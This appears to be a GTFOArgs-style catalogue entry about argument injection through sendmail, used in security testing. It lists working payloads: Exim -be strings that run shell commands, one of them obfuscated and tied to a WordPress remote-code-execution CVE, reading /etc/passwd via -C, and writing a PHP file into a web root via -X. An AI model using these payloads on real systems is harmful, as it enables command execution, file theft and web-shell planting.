---
trust_level: community
id: argument-injection-sendmail
namespace: argument:injection:sendmail
name: sendmail
description: "Argument injection via sendmail"
version: "1.0.0"
capabilities:
  - security.execution.command
  - network.transfer.upload
  - system.file.write
platforms:
  - cross-platform
techniques:
  - execution
  - exfiltration
execution:
  template: "sendmail"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "The -be flag can be used to execute system commands, when sendmail is provided by Exim4."
    command: "sendmail -be '${run{/bin/sh -c \"uname -a\"}{yes}{no}}'
"
  - description: "See [\\\"PoC HTTP request / minimal PoC exploit\\\"](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html) for more information about this exploit. This example runs `uname -a`."
    command: "sendmail -t -i -f 'email@address.com(tmp1' -be '${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}uname${substr{10}{1}{$tod_log}}-a$}}' 'tmp2)'
"
  - description: "Arbitrary files can be delivered."
    command: "sendmail -t -i -f mail@address.com -C/etc/passwd -X/dev/null < mail.txt
"
  - description: "Arbitrary local files can be written to a new location. It is worthy of playing around with the ability to upload files/the contents of the mail being sent."
    command: "sendmail -t -i -f mail@address.com -X/var/www/html/exploit.php < mail.txt
"
references:
  - label: "GTFOArgs"
    url: "https://gtfoargs.github.io/gtfoargs/sendmail/"
---

# sendmail

GTFOArgs entry for sendmail. This binary can be used to inject arguments for execution, file operations, or other capabilities.
